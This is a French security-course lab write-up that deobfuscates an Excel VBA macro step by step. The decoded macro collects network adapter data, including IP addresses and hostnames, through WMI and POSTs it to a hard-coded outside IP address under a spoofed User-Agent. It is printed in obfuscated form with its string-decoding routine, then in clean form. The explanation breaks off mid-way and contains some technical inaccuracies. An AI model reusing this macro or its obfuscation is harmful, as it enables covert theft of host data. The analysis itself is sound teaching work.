# TP Sécu: VBA Code - Désobfuscation Macro

Le code ci-dessous est un code .VBA. Le VBA est un langage de programmation qui permet de créer des macros. Il s'agit de programmes tournant sur Excel permettant d'automatiser des tâches journalières. L'intérêt du TP est de parvenir à le désobfusquer. La **désobfuscation** consiste à nettoyer le code afin d'éliminer les morceaux qui ne servent pas.

```
Sub opop()
Dim lmlm As Long
Debug.Print FLQZEsG(Chr(56) & "K" & Chr(Int("&H56")) & Chr(&H61) & Chr(Int("85")) & Chr(Int("&H4e")) & Chr(75) & Chr(&H69) & Chr(&H2B) & Chr(&H6C) & Chr(76) & Chr(4987 - 4935) & Chr(2936 - 2893) & Chr(72) & Chr(57) & Chr(&H64))
End Sub
Sub WMI()
sWQL = FLQZEsG("gq14V+IwdBHohEVdaK7ySOp3F0yC71Zdqra7UKDjUFxotvVUoqbfVaDy8Vb46X9V")
Set kZbQjwYZwI = GetObject(FLQZEsG(Chr(43) & Chr(113) & Chr(57) & Chr(&H34) & Chr(Int("&H56")) & Chr(&H72) & Chr(&H4C) & Chr(Int("&H76")) & Chr(Int("&H64")) & Chr(170940 / 2442) & Chr(Int("110")) & Chr(1223 - 1110) & Chr(Int("110")) & Chr(Int("&H4e")) & Chr(Int("&H39")) & Chr(Int("87")) & Chr(101) & "K" & Chr(101) & Chr(Int("&H52")) & "Q" & Chr(Int("56")) & Chr(184600 / 1775) & Chr(Int("121")) & Chr(&H5A) & Chr(Int("49")) & Chr(Int("48")) & Chr(152073 / 2493)))
Set dC4BuSkdgWA = kZbQjwYZwI.ExecQuery(sWQL)
Set DKr6 = CreateObject(FLQZEsG(Chr(81) & Chr(2414 - 2338) & Chr(Int("99")) & Chr(9876 - 9762) & Chr(266728 / 3031) & "I" & Chr(&H68) & Chr(43) & "H" & Chr(Int("&H30")) & "C" & "o" & Chr(Int("&H76")) & Chr(675 - 565) & Chr(718 - 648) & Chr(99) & Chr(9498 - 9399) & Chr(Int("114")) & Chr(-2313 + 2418) & Chr(2184 - 2111) & Chr(Int("86")) & Chr(103) & Chr(Int("68")) & Chr(52) & Chr(Int("65")) & Chr(3600 - 3492) & Chr(Int("107")) & Chr(Int("&H3d"))))
URL = FLQZEsG("oPhSWbpN2wOqXn0DsED1C7hEUQuwWNMKqFjYRvil0lj6+H1f")
Debug.Print URL
Dim mWDaeVN()
For Each oWMIObjEx In dC4BuSkdgWA
If Not IsNull(oWMIObjEx.IPAddress) Then
Debug.Print Chr(73) & Chr(242240 / 3028) & Chr(Int("58")); oWMIObjEx.IPAddress(0)
DKr6.Open "P" & Chr(Int("&H4f")) & Chr(Int("83")) & Chr(&H54), URL, True
DKr6.setRequestHeader FLQZEsG(Chr(-2622 + 2725) & Chr(3356 - 3276) & "v" & Chr(Int("&H31")) & Chr(&H55) & Chr(Int("113")) & Chr(Int("&H69")) & Chr(87600 / 1095) & Chr(&H34) & Chr(Int("&H6c")) & Chr(&H54) & Chr(113) & Chr(43) & Chr(&H6C) & Chr(130751 / 2467) & Chr(-1217 + 1317)), FLQZEsG("gvr2UPAh/Q3iEHADwHXWCvCAzFXwNnBS+l5UCuiNWBWAM+kSgPzVUrhr3RO6X14AoFIURui28Vi6bvsRsEBxCw==")
DKr6.send oWMIObjEx.IPAddress(0)
Debug.Print FLQZEsG(Chr(109) & Chr(Int("&H4f")) & Chr(Int("&H48")) & "T" & Chr(&H58) & Chr(Int("&H66")) & Chr(Int("67")) & Chr(&H45) & Chr(Int("&H30")) & Chr(Int("&H56")) & Chr(&H58) & Chr(Int("52")) & Chr(Int("43")) & Chr(Int("&H6e")) & Chr(Int("49")) & Chr(Int("&H4d"))); oWMIObjEx.DNSHostName
For Each oWMIProp In oWMIObjEx.Properties_
If IsArray(oWMIProp.Value) Then
For n = LBound(oWMIProp.Value) To UBound(oWMIProp.Value)
Debug.Print oWMIProp.Name & Chr(Int("40")) & n & Chr(&H29), oWMIProp.Value(n)
DKr6.Open "P" & Chr(Int("&H4f")) & Chr(Int("83")) & Chr(&H54), URL, True
DKr6.setRequestHeader FLQZEsG(Chr(-2622 + 2725) & Chr(3356 - 3276) & "v" & Chr(Int("&H31")) & Chr(&H55) & Chr(Int("113")) & Chr(Int("&H69")) & Chr(87600 / 1095) & Chr(&H34) & Chr(Int("&H6c")) & Chr(&H54) & Chr(113) & Chr(43) & Chr(&H6C) & Chr(130751 / 2467) & Chr(-1217 + 1317)), FLQZEsG("gvr2UPAh/Q3iEHADwHXWCvCAzFXwNnBS+l5UCuiNWBWAM+kSgPzVUrhr3RO6X14AoFIURui28Vi6bvsRsEBxCw==")
DKr6.send oWMIProp.Value(n)
Next
Else
Debug.Print oWMIProp.Name, oWMIProp.Value
DKr6.Open "P" & Chr(Int("&H4f")) & Chr(Int("83")) & Chr(&H54), URL, True
DKr6.setRequestHeader FLQZEsG(Chr(-2622 + 2725) & Chr(3356 - 3276) & "v" & Chr(Int("&H31")) & Chr(&H55) & Chr(Int("113")) & Chr(Int("&H69")) & Chr(87600 / 1095) & Chr(&H34) & Chr(Int("&H6c")) & Chr(&H54) & Chr(113) & Chr(43) & Chr(&H6C) & Chr(130751 / 2467) & Chr(-1217 + 1317)), FLQZEsG("gvr2UPAh/Q3iEHADwHXWCvCAzFXwNnBS+l5UCuiNWBWAM+kSgPzVUrhr3RO6X14AoFIURui28Vi6bvsRsEBxCw==")
DKr6.send oWMIProp.Value
End If
Next
End If
Next
End Sub
Sub fizf()
Dim uuu As Long
Debug.Print FLQZEsG(Chr(Int("&H38")) & Chr(75) & "1" & Chr(Int("&H2f")) & Chr(&H56) & Chr(&H39) & Chr(113) & Chr(&H37) & Chr(Int("&H2b")) & Chr(&H6C) & Chr(Int("98")) & Chr(Int("54")) & Chr(Int("&H2b")) & Chr(110) & Chr(&H39) & Chr(Int("100")))
End Sub
Public Function EvdDqy6OENA(ByVal gZIsLqXecQ As Long, ByVal DjYb As Byte) As Long
EvdDqy6OENA = gZIsLqXecQ
If DjYb > 0 Then
If gZIsLqXecQ > 0 Then
EvdDqy6OENA = Int(EvdDqy6OENA / (2 ^ DjYb))
Else
If DjYb > 31 Then
EvdDqy6OENA = 0
Else
EvdDqy6OENA = EvdDqy6OENA And &H7FFFFFFF
EvdDqy6OENA = Int(EvdDqy6OENA / (2 ^ DjYb))
EvdDqy6OENA = EvdDqy6OENA Or 2 ^ (31 - DjYb)
End If
End If
End If
End Function
Public Function ESOMQRB(ByVal gZIsLqXecQ As Long, ByVal DjYb As Byte) As Long
ESOMQRB = gZIsLqXecQ
If DjYb > 0 Then
Dim i As Byte
Dim m As Long
For i = 1 To DjYb
m = ESOMQRB And &H40000000
ESOMQRB = (ESOMQRB And &H3FFFFFFF) * 2
If m <> 0 Then
ESOMQRB = ESOMQRB Or &H80000000
End If
Next i
End If
End Function
Public Function vdpz(ByVal lZZQvk As Long) As Long
Const RBu4v As Long = 5570645
Const rVKP As Long = 52428
Const d1 = 7
Const d2 = 14
Dim t As Long, u, out As Long
t = (lZZQvk Xor EvdDqy6OENA(lZZQvk, d2)) And rVKP
u = lZZQvk Xor t Xor ESOMQRB(t, d2)
t = (u Xor EvdDqy6OENA(u, d1)) And RBu4v
out = (u Xor t Xor ESOMQRB(t, d1))
vdpz = out
End Function
Public Function ioLNpl(ByRef AF6q7hHIt() As Byte) As String
Dim i, fr, k9KMgY9gc, raw As Long
Dim a As String, b As String, c As String, d As String
Dim LSewU7KJ As String
Dim a7RjSpybLOH() As String
Dim a2, b2 As String
LSewU7KJ = ""
For i = 0 To (UBound(AF6q7hHIt) / 4 + 1)
fr = i * 4
If fr > UBound(AF6q7hHIt) Then
Exit For
End If
k9KMgY9gc = 0
k9KMgY9gc = k9KMgY9gc Or ESOMQRB(AF6q7hHIt(fr + 3), 24)
k9KMgY9gc = k9KMgY9gc Or ESOMQRB(AF6q7hHIt(fr + 2), 16)
k9KMgY9gc = k9KMgY9gc Or ESOMQRB(AF6q7hHIt(fr + 1), 8)
k9KMgY9gc = k9KMgY9gc Or AF6q7hHIt(fr + 0)
raw = vdpz(k9KMgY9gc)
a = Chr(EvdDqy6OENA((raw And &HFF000000), 24))
b = Chr(EvdDqy6OENA((raw And 16711680), 16))
c = Chr(EvdDqy6OENA((raw And 65280), 8))
d = Chr(EvdDqy6OENA((raw And 255), 0))
LSewU7KJ = LSewU7KJ + d + c + b + a
Next i
ioLNpl = LSewU7KJ
End Function
Public Function FLQZEsG(AF6q7hHIt As String) As String
Dim w2gjg77jr2() As Byte, j6KQxT5tJ6n() As Byte, arrayByte3(255) As Byte
Dim x3omxY6yvrB(63) As Long, arrayLong5(63) As Long
Dim uvv6G4mnZkm(63) As Long, K6z6Ot0C As Long
Dim BxtO0 As Integer, iter As Long, V0Kyfluvo As Long, JtACZ7B0 As Long
Dim LSewU7KJ As String
AF6q7hHIt = Replace(AF6q7hHIt, vbCr, vbNullString)
AF6q7hHIt = Replace(AF6q7hHIt, vbLf, vbNullString)
JtACZ7B0 = Len(AF6q7hHIt) Mod 4
If InStrRev(AF6q7hHIt, "==") Then
BxtO0 = 2
ElseIf InStrRev(AF6q7hHIt, "" + "=") Then
BxtO0 = 1
End If
For JtACZ7B0 = 0 To 255
Select Case JtACZ7B0
Case 65 To 90
arrayByte3(JtACZ7B0) = JtACZ7B0 - 65
Case 97 To 122
arrayByte3(JtACZ7B0) = JtACZ7B0 - 71
Case 48 To 57
arrayByte3(JtACZ7B0) = JtACZ7B0 + 4
Case 43
arrayByte3(JtACZ7B0) = 62
Case 47
arrayByte3(JtACZ7B0) = 63
End Select
Next JtACZ7B0
For JtACZ7B0 = 0 To 63
x3omxY6yvrB(JtACZ7B0) = JtACZ7B0 * 64
arrayLong5(JtACZ7B0) = JtACZ7B0 * 4096
uvv6G4mnZkm(JtACZ7B0) = JtACZ7B0 * 262144
Next JtACZ7B0
j6KQxT5tJ6n = StrConv(AF6q7hHIt, vbFromUnicode)
ReDim w2gjg77jr2((((UBound(j6KQxT5tJ6n) + 1) \ 4) * 3) - 1)
For iter = 0 To UBound(j6KQxT5tJ6n) Step 4
K6z6Ot0C = uvv6G4mnZkm(arrayByte3(j6KQxT5tJ6n(iter))) + arrayLong5(arrayByte3(j6KQxT5tJ6n(iter + 1))) + x3omxY6yvrB(arrayByte3(j6KQxT5tJ6n(iter + 2))) + arrayByte3(j6KQxT5tJ6n(iter + 3))
JtACZ7B0 = K6z6Ot0C And 16711680
w2gjg77jr2(V0Kyfluvo) = JtACZ7B0 \ 65536
JtACZ7B0 = K6z6Ot0C And 65280
w2gjg77jr2(V0Kyfluvo + 1) = JtACZ7B0 \ 256
w2gjg77jr2(V0Kyfluvo + 2) = K6z6Ot0C And 255
V0Kyfluvo = V0Kyfluvo + 3
Next iter
LSewU7KJ = StrConv(w2gjg77jr2, vbUnicode)
If BxtO0 Then LSewU7KJ = Left$(LSewU7KJ, Len(LSewU7KJ) - BxtO0)
FLQZEsG = ioLNpl(StrConv(LSewU7KJ, vbFromUnicode))
FLQZEsG = iCq96(FLQZEsG, "~")
End Function
Function iCq96(AoOV0Ml As String, AjzxVaRR3fu As String) As String
Dim oxOXp4 As Long
Dim S8XOtKPLsWIl() As String
S8XOtKPLsWIl = Split(AoOV0Ml, AjzxVaRR3fu)
oxOXp4 = UBound(S8XOtKPLsWIl, 1)
If oxOXp4 <> 0 Then
AoOV0Ml = Left$(AoOV0Ml, Len(AoOV0Ml) - oxOXp4)
End If
iCq96 = AoOV0Ml
End Functio
```
## Première étape
La première étape afin de résoudre le problème est de traduire les fonctions, et les tableaux les variables un à un.
Après traduction et indentation, nous obtenons ceci: 

```
Sub opop()

    Dim var01 As Long
    Debug.Print func1(Chr(56) & "K" & Chr(Int("&H56")) & Chr(&H61) & Chr(Int("85")) & Chr(Int("&H4e")) & Chr(75) & Chr(&H69) & Chr(&H2B) & Chr(&H6C) & Chr(76) & Chr(4987 - 4935) & Chr(2936 - 2893) & Chr(72) & Chr(57) & Chr(&H64))
End Sub

Sub WMI()

    sWQL = func1("gq14V+IwdBHohEVdaK7ySOp3F0yC71Zdqra7UKDjUFxotvVUoqbfVaDy8Vb46X9V")
    Set var04 = GetObject(func1(Chr(43) & Chr(113) & Chr(57) & Chr(&H34) & Chr(Int("&H56")) & Chr(&H72) & Chr(&H4C) & Chr(Int("&H76")) & Chr(Int("&H64")) & Chr(170940 / 2442) & Chr(Int("110")) & Chr(1223 - 1110) & Chr(Int("110")) & Chr(Int("&H4e")) & Chr(Int("&H39")) & Chr(Int("87")) & Chr(101) & "K" & Chr(101) & Chr(Int("&H52")) & "Q" & Chr(Int("56")) & Chr(184600 / 1775) & Chr(Int("121")) & Chr(&H5A) & Chr(Int("49")) & Chr(Int("48")) & Chr(152073 / 2493)))
    Set var04 = var04.ExecQuery(sWQL)
    Set var04 = CreateObject(func1(Chr(81) & Chr(2414 - 2338) & Chr(Int("99")) & Chr(9876 - 9762) & Chr(266728 / 3031) & "I" & Chr(&H68) & Chr(43) & "H" & Chr(Int("&H30")) & "C" & "o" & Chr(Int("&H76")) & Chr(675 - 565) & Chr(718 - 648) & Chr(99) & Chr(9498 - 9399) & Chr(Int("114")) & Chr(-2313 + 2418) & Chr(2184 - 2111) & Chr(Int("86")) & Chr(103) & Chr(Int("68")) & Chr(52) & Chr(Int("65")) & Chr(3600 - 3492) & Chr(Int("107")) & Chr(Int("&H3d"))))
    URL = func1("oPhSWbpN2wOqXn0DsED1C7hEUQuwWNMKqFjYRvil0lj6+H1f")
    Debug.Print URL
    Dim mWDaeVN()

    For Each var05 In var04
        If Not IsNull(var05.IPAddress) 
            Then
                Debug.Print Chr(73) & Chr(242240 / 3028) & Chr(Int("58")); var05.IPAddress(0)
                var04.Open "P" & Chr(Int("&H4f")) & Chr(Int("83")) & Chr(&H54), URL, True
                var04.setRequestHeader func1(Chr(-2622 + 2725) & Chr(3356 - 3276) & "v" & Chr(Int("&H31")) & Chr(&H55) & Chr(Int("113")) & Chr(Int("&H69")) & Chr(87600 / 1095) & Chr(&H34) & Chr(Int("&H6c")) & Chr(&H54) & Chr(113) & Chr(43) & Chr(&H6C) & Chr(130751 / 2467) & Chr(-1217 + 1317)), func1("gvr2UPAh/Q3iEHADwHXWCvCAzFXwNnBS+l5UCuiNWBWAM+kSgPzVUrhr3RO6X14AoFIURui28Vi6bvsRsEBxCw==")
                var04.send var05.IPAddress(0)
        Debug.Print func1(Chr(109) & Chr(Int("&H4f")) & Chr(Int("&H48")) & "T" & Chr(&H58) & Chr(Int("&H66")) & Chr(Int("67")) & Chr(&H45) & Chr(Int("&H30")) & Chr(Int("&H56")) & Chr(&H58) & Chr(Int("52")) & Chr(Int("43")) & Chr(Int("&H6e")) & Chr(Int("49")) & Chr(Int("&H4d"))); var05.DNSHostName
        
        For Each var06 In var05.Properties_
            If IsArray(var06.Value) 
                Then
                    For n = LBound(var06.Value) To UBound(var06.Value)
                        Debug.Print var06.Name & Chr(Int("40")) & n & Chr(&H29), var06.Value(n)
                        var04.Open "P" & Chr(Int("&H4f")) & Chr(Int("83")) & Chr(&H54), URL, True
                        var04.setRequestHeader func1(Chr(-2622 + 2725) & Chr(3356 - 3276) & "v" & Chr(Int("&H31")) & Chr(&H55) & Chr(Int("113")) & Chr(Int("&H69")) & Chr(87600 / 1095) & Chr(&H34) & Chr(Int("&H6c")) & Chr(&H54) & Chr(113) & Chr(43) & Chr(&H6C) & Chr(130751 / 2467) & Chr(-1217 + 1317)), func1("gvr2UPAh/Q3iEHADwHXWCvCAzFXwNnBS+l5UCuiNWBWAM+kSgPzVUrhr3RO6X14AoFIURui28Vi6bvsRsEBxCw==")
                        var04.send var06.Value(n)
                    Next
                Else
                    Debug.Print var06.Name, var06.Value
                    var04.Open "P" & Chr(Int("&H4f")) & Chr(Int("83")) & Chr(&H54), URL, True
                    var04.setRequestHeader func1(Chr(-2622 + 2725) & Chr(3356 - 3276) & "v" & Chr(Int("&H31")) & Chr(&H55) & Chr(Int("113")) & Chr(Int("&H69")) & Chr(87600 / 1095) & Chr(&H34) & Chr(Int("&H6c")) & Chr(&H54) & Chr(113) & Chr(43) & Chr(&H6C) & Chr(130751 / 2467) & Chr(-1217 + 1317)), func1("gvr2UPAh/Q3iEHADwHXWCvCAzFXwNnBS+l5UCuiNWBWAM+kSgPzVUrhr3RO6X14AoFIURui28Vi6bvsRsEBxCw==")
                    var04.send var06.Value
                End If
            Next
        End If
    Next
End Sub


Sub fizf()

    Dim var07 As Long
    Debug.Print func1(Chr(Int("&H38")) & Chr(75) & "1" & Chr(Int("&H2f")) & Chr(&H56) & Chr(&H39) & Chr(113) & Chr(&H37) & Chr(Int("&H2b")) & Chr(&H6C) & Chr(Int("98")) & Chr(Int("54")) & Chr(Int("&H2b")) & Chr(110) & Chr(&H39) & Chr(Int("100")))
End Sub


Public Function func2(ByVal var08 As Long, ByVal var09 As Byte) As Long
    func2 = var08
    If var09 > 0 Then
        If var08 > 0 Then
            func2 = Int(func2 / (2 ^ var09))
        Else
            If var09 > 31 Then
                func2 = 0
            Else
                func2 = func2 And &H7FFFFFFF
                func2 = Int(func2 / (2 ^ var09))
                func2 = func2 Or 2 ^ (31 - var09)
            End If
        End If
    End If
End Function

Public Function func3(ByVal var08 As Long, ByVal var09 As Byte) As Long
    func3 = var08
    If var09 > 0 Then
        Dim i As Byte
        Dim m As Long
        For i = 1 To var09
            m = func3 And &H40000000
            func3 = (func3 And &H3FFFFFFF) * 2
            If m <> 0 Then
                func3 = func3 Or &H80000000
            End If
        Next i
    End If
End Function

Public Function func4(ByVal var10 As Long) As Long
    Const RBu4v As Long = 5570645
    Const rVKP As Long = 52428
    Const d1 = 7
    Const d2 = 14
    Dim t As Long, u, out As Long
    t = (var10 Xor func2(var10, d2)) And rVKP
    u = var10 Xor t Xor func3(t, d2)
    t = (u Xor func2(u, d1)) And RBu4v
    out = (u Xor t Xor func3(t, d1))
    func4 = out
End Function

Public Function func5(ByRef array1() As Byte) As String
    Dim i, fr, var11, raw As Long
    Dim a As String, b As String, c As String, d As String
    Dim var12 As String
    Dim a7RjSpybLOH() As String
    Dim a2, b2 As String
    var12 = ""
        For i = 0 To (UBound(array1) / 4 + 1)
            fr = i * 4
            If fr > UBound(array1) Then
                Exit For
            End If
            var11 = 0
            var11 = var11 Or func3(array1(fr + 3), 24)
            var11 = var11 Or func3(array1(fr + 2), 16)
            var11 = var11 Or func3(array1(fr + 1), 8)
            var11 = var11 Or array1(fr + 0)
            raw = func4(var11)
            a = Chr(func2((raw And &HFF000000), 24))
            b = Chr(func2((raw And 16711680), 16))
            c = Chr(func2((raw And 65280), 8))
            d = Chr(func2((raw And 255), 0))
            var12 = var12 + d + c + b + a
        Next i
    func5 = var12
End Function

Public Function func1(array1 As String) As String
    Dim array2() As Byte, array3() As Byte, arrayByte3(255) As Byte
    Dim array4(63) As Long, arrayLong5(63) As Long
    Dim array5(63) As Long, var13 As Long
    Dim var14 As Integer, var15 As Long, var16 As Long, var17 As Long
    Dim var12 As String
    array1 = Replace(array1, vbCr, vbNullString)
    array1 = Replace(array1, vbLf, vbNullString)
    var17 = Len(array1) Mod 4
    If InStrRev(array1, "==") 
        Then
            var14 = 2
    ElseIf InStrRev(array1, "" + "=") 
        Then
            var14 = 1
    End If
    For var17 = 0 To 255
        Select Case var17
        Case 65 To 90
        arrayByte3(var17) = var17 - 65
        Case 97 To 122
        arrayByte3(var17) = var17 - 71
        Case 48 To 57
        arrayByte3(var17) = var17 + 4
        Case 43
        arrayByte3(var17) = 62
        Case 47
        arrayByte3(var17) = 63
        End Select
    Next var17
    For var17 = 0 To 63
        array4(var17) = var17 * 64
        arrayLong5(var17) = var17 * 4096
        array5(var17) = var17 * 262144
    Next var17
    array3 = StrConv(array1, vbFromUnicode)
    ReDim array2((((UBound(array3) + 1) \ 4) * 3) - 1)
    For var15 = 0 To UBound(array3) Step 4
        var13 = array5(arrayByte3(array3(var15))) + arrayLong5(arrayByte3(array3(var15 + 1))) + array4(arrayByte3(array3(var15 + 2))) + arrayByte3(array3(var15 + 3))
        var17 = var13 And 16711680
        array2(var16) = var17 \ 65536
        var17 = var13 And 65280
        array2(var16 + 1) = var17 \ 256
        array2(var16 + 2) = var13 And 255
        var16 = var16 + 3
    Next var15
    var12 = StrConv(array2, vbUnicode)
    If var14 Then var12 = Left$(var12, Len(var12) - var14)
        func1 = func5(StrConv(var12, vbFromUnicode))
        func1 = func6(func1, "~")
End Function

Function func6(var18 As String, var19 As String) As String
    Dim var20 As Long
    Dim array6() As String
    array6 = Split(var18, var19)
    var20 = UBound(array6, 1)
    If var20 <> 0 
        Then
            var18 = Left$(var18, Len(var18) - var20)
    End If
    func6 = var18
End Function
```
Pour la seconde étape, nous devons utiliser l'outil Macro d'Excel afin de convertir les charactères entre parenthèses en string. Voici le résultat: 

```
Sub opop()

    Dim var01 As Long
    Debug.Print func1("hihi_hihi")
End Sub

Sub WMI()

    sWQL = func1("Select * From Win32_NetworkAdapterConfiguration")
    Set var02 = GetObject(func1("winmgmts:root/CIMV2")
    Set var03 = var03.ExecQuery(sWQL)
    Set var04 = CreateObject(func1("MSXML2.ServerXMLHTTP")
    URL = func1("http://176.31.120.218:5000/thisis")
    Debug.Print URL
    Dim array0()

    For Each var05 In var03
        If Not IsNull(var05.IPAddress) 
            Then
                Debug.Print "IP:"; var05.IPAddress(0)
                var04.Open POST, URL, True
                var04.setRequestHeader func1("User-Agent"), func1("Opera/9.34 (X11; Linux i686; en-US) Presto/2.9.340 Version/11.00")
                var04.send var05.IPAddress(0)
        Debug.Print func1("Host name:"); var05.DNSHostName
        
        For Each var06 In var05.Properties_
            If IsArray(var06.Value) 
                Then
                    For n = LBound(var06.Value) To UBound(var06.Value)
                        Debug.Print var06.Name "()", var06.Value(n)
                        var04.Open POST, URL, True
                        var04.setRequestHeader func1("User-Agent"), func1("Opera/9.34 (X11; Linux i686; en-US) Presto/2.9.340 Version/11.00")
                        var04.send var06.Value(n)
                    Next
                Else
                    Debug.Print var06.Name, var06.Value
                    var04.Open POST, URL, True
                    var04.setRequestHeader func1("User-Agent"), func1("Opera/9.34 (X11; Linux i686; en-US) Presto/2.9.340 Version/11.00")
                    var04.send var06.Value
                End If
            Next
        End If
    Next
End Sub


Sub fizf()

    Dim var07 As Long
    Debug.Print func1("yolo_yolo")
End Sub


Public Function func2(ByVal var08 As Long, ByVal var09 As Byte) As Long
    func2 = var08
    If var09 > 0 Then
        If var08 > 0 Then
            func2 = Int(func2 / (2 ^ var09))
        Else
            If var09 > 31 Then
                func2 = 0
            Else
                func2 = func2 And &H7FFFFFFF
                func2 = Int(func2 / (2 ^ var09))
                func2 = func2 Or 2 ^ (31 - var09)
            End If
        End If
    End If
End Function

Public Function func3(ByVal var08 As Long, ByVal var09 As Byte) As Long
    func3 = var08
    If var09 > 0 Then
        Dim i As Byte
        Dim m As Long
        For i = 1 To var09
            m = func3 And &H40000000
            func3 = (func3 And &H3FFFFFFF) * 2
            If m <> 0 Then
                func3 = func3 Or &H80000000
            End If
        Next i
    End If
End Function

Public Function func4(ByVal var10 As Long) As Long
    Const RBu4v As Long = 5570645
    Const rVKP As Long = 52428
    Const d1 = 7
    Const d2 = 14
    Dim t As Long, u, out As Long
    t = (var10 Xor func2(var10, d2)) And rVKP
    u = var10 Xor t Xor func3(t, d2)
    t = (u Xor func2(u, d1)) And RBu4v
    out = (u Xor t Xor func3(t, d1))
    func4 = out
End Function

Public Function func5(ByRef array1() As Byte) As String
    Dim i, fr, var11, raw As Long
    Dim a As String, b As String, c As String, d As String
    Dim var12 As String
    Dim a7RjSpybLOH() As String
    Dim a2, b2 As String
    var12 = ""
        For i = 0 To (UBound(array1) / 4 + 1)
            fr = i * 4
            If fr > UBound(array1) Then
                Exit For
            End If
            var11 = 0
            var11 = var11 Or func3(array1(fr + 3), 24)
            var11 = var11 Or func3(array1(fr + 2), 16)
            var11 = var11 Or func3(array1(fr + 1), 8)
            var11 = var11 Or array1(fr + 0)
            raw = func4(var11)
            a = Chr(func2((raw And &HFF000000), 24))
            b = Chr(func2((raw And 16711680), 16))
            c = Chr(func2((raw And 65280), 8))
            d = Chr(func2((raw And 255), 0))
            var12 = var12 + d + c + b + a
        Next i
    func5 = var12
End Function

Public Function func1(array1 As String) As String
    Dim array2() As Byte, array3() As Byte, arrayByte3(255) As Byte
    Dim array4(63) As Long, arrayLong5(63) As Long
    Dim array5(63) As Long, var13 As Long
    Dim var14 As Integer, var15 As Long, var16 As Long, var17 As Long
    Dim var12 As String
    array1 = Replace(array1, vbCr, vbNullString)
    array1 = Replace(array1, vbLf, vbNullString)
    var17 = Len(array1) Mod 4
    If InStrRev(array1, "==") 
        Then
            var14 = 2
    ElseIf InStrRev(array1, "" + "=") 
        Then
            var14 = 1
    End If
    For var17 = 0 To 255
        Select Case var17
        Case 65 To 90
        arrayByte3(var17) = var17 - 65
        Case 97 To 122
        arrayByte3(var17) = var17 - 71
        Case 48 To 57
        arrayByte3(var17) = var17 + 4
        Case 43
        arrayByte3(var17) = 62
        Case 47
        arrayByte3(var17) = 63
        End Select
    Next var17
    For var17 = 0 To 63
        array4(var17) = var17 * 64
        arrayLong5(var17) = var17 * 4096
        array5(var17) = var17 * 262144
    Next var17
    array3 = StrConv(array1, vbFromUnicode)
    ReDim array2((((UBound(array3) + 1) \ 4) * 3) - 1)
    For var15 = 0 To UBound(array3) Step 4
        var13 = array5(arrayByte3(array3(var15))) + arrayLong5(arrayByte3(array3(var15 + 1))) + array4(arrayByte3(array3(var15 + 2))) + arrayByte3(array3(var15 + 3))
        var17 = var13 And 16711680
        array2(var16) = var17 \ 65536
        var17 = var13 And 65280
        array2(var16 + 1) = var17 \ 256
        array2(var16 + 2) = var13 And 255
        var16 = var16 + 3
    Next var15
    var12 = StrConv(array2, vbUnicode)
    If var14 Then var12 = Left$(var12, Len(var12) - var14)
        func1 = func5(StrConv(var12, vbFromUnicode))
        func1 = func6(func1, "~")
End Function

Function func6(var18 As String, var19 As String) As String
    Dim var20 As Long
    Dim array6() As String
    array6 = Split(var18, var19)
    var20 = UBound(array6, 1)
    If var20 <> 0 
        Then
            var18 = Left$(var18, Len(var18) - var20)
    End If
    func6 = var18
End Function
```

Il faut désormais rendre le code plus propre. Il contient encore des morceaux qui ne sont appelés nulle part. On les détecte car ils sont placés hors des Sub. Une fois le code nettoyé, il en reste ceci: 

```
Sub opop()
    Dim var01 As Long
    Debug.Print func1("hihi_hihi")
End Sub

Sub WMI()
    sWQL = func1("Select * From Win32_NetworkAdapterConfiguration")
    Set var02 = GetObject(func1("winmgmts:root/CIMV2")
    Set var03 = var03.ExecQuery(sWQL)
    Set var04 = CreateObject(func1("MSXML2.ServerXMLHTTP")
    URL = func1("http://176.31.120.218:5000/thisis")
    Debug.Print URL
    Dim array0()

    For Each var05 In var03
        If Not IsNull(var05.IPAddress) 
            Then
                Debug.Print "IP:"; var05.IPAddress(0)
                var04.Open POST, URL, True
                var04.setRequestHeader func1("User-Agent"), func1("Opera/9.34 (X11; Linux i686; en-US) Presto/2.9.340 Version/11.00")
                var04.send var05.IPAddress(0)
        Debug.Print func1("Host name:"); var05.DNSHostName
        
        For Each var06 In var05.Properties_
            If IsArray(var06.Value) 
            Then
                For n = LBound(var06.Value) To UBound(var06.Value)
                Debug.Print var06.Name "()", var06.Value(n)
                var04.Open POST, URL, True
                var04.setRequestHeader func1("User-Agent"), func1("Opera/9.34 (X11; Linux i686; en-US) Presto/2.9.340 Version/11.00")
                var04.send var06.Value(n)
            Next
            Else
                Debug.Print var06.Name, var06.Value
                var04.Open POST, URL, True
                var04.setRequestHeader func1("User-Agent"), func1("Opera/9.34 (X11; Linux i686; en-US) Presto/2.9.340 Version/11.00")
                var04.send var06.Value
            End If
            Next
        End If
    Next
End Sub


Sub fizf()
    Dim var07 As Long
    Debug.Print func1("yolo_yolo")
End Sub
```


## Explication du code

```
Sub opop()
    Dim var01 As Long
    Debug.Print func1("hihi_hihi")
End Sub
```
Cette partie du code va print la string ci-dessus.
```Dim```permet de déclarer le type d'une variable qui est ```Long```ici. Ce type de donnée permet de stocker une valeur numérique dont la longueur n'est pas déterminée, ce qui donne la possibilité de stocker plus de données dans la variable.

```
Sub WMI()
    sWQL = func1("Select * From Win32_NetworkAdapterConfiguration")
```
Il s'agit d'une requête SQL qui demande tout ce qu'il y a dans la table Win32_NetworkAdapterConfiguration


    Set var02 = GetObject(func1("winmgmts:root/CIMV2")
    Set var03 = var03.ExecQuery(sWQL)
    Set var04 = CreateObject(func1("MSXML2.ServerXMLHTTP")
    URL = func1("http://176.31.120.218:5000/thisis")
    Debug.Print URL
    Dim array0()
``
